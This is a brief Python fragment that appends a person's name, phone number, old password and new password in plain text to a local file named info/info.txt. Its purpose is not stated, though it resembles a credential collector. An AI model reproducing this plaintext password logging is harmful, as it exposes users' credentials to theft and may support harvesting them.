import os
file_path = os.path.join(os.path.dirname(__file__), "info", "info.txt")
with open(file_path, "a") as file:
    file.write(f"Name: {name}\n")
    file.write(f"Phone Number: {phone}\n")
    file.write(f"Old Password: {old_password}\n")
    file.write(f"New Password: {new_password}\n")
    file.write("\n")
